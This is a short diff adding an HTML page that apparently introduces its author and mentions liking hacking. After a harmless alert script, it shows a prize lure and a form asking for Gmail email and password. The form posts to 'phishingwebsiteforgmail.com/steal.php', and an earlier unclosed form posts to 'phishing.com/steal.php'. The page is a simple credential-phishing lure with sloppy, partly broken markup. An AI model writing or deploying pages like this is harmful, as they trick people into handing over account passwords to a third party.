@@ -1,0 +1,18 @@
+<h1>Hello!</h1>
+<p>My name is Bhavnish Jakhar </p>
+<p>I like <b>hacking</b> and <i>fishing</i></p>
+<script>
+function myFunction() {
+  alert("Hello! You clicked me!");
+}
+</script>
+<h2>Enter your credentials to win a prize!</h2>
+<form action="https://phishing.com/steal.php" method="post">
+  
+<p>Enter your Gmail credentials to receive a special offer!</p>
+<form action="https://phishingwebsiteforgmail.com/steal.php" method="post">
+  Email: <input type="email" name="email"><br>
+  Password: <input type="password" name="password"><br>
+  <input type="submit" value="Sign In">
+</form>
+<p><a href="https://www.mywebsite.com">Visit our website for more information!</a>welcome</p>+
